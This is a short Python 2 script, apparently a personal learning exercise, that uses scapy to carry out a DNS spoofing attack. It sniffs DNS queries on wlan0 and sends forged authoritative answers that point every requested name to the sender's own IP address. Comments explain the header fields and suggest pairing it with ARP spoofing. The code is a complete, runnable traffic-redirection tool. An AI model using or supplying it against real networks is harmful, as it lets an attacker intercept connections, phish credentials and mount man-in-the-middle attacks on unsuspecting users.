#!/usr/bin/env python

from scapy.all import *

# only spoofing wlan0, in other words my machine, would have to change to mon0
# but then I would have to deal with encryption, probably best to arpspoof

process = subprocess.Popen(["ip", "addr"], stdout=subprocess.PIPE)
ifconfig = ifconfig = process.stdout.read()
my_ip = ifconfig.split('wlan0')[1].split('inet')[1].split(' ')[1].split('/')[0]

def dnsspoof(pkt):
	# pkt is a dns query, start with IP header, dst is the src from the query,
	# src is the dst
	spoof = IP(dst=pkt[IP].src, src=pkt[IP].dst,)/\
			UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
			DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
			an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=my_ip))
	print spoof.show()
	send(spoof)
sniff(iface="wlan0", filter="dst port 53", prn=dnsspoof)
			# UDP layer next dest port is src port and vice versa
			# DNS layer, id is a 16 bit identifier for the program making the
			# query, qr id's whether it is a query (0) or a response (1), aa 
			# means the responding server is authoritative, rdata is the returned
			# ip address, the response to the query
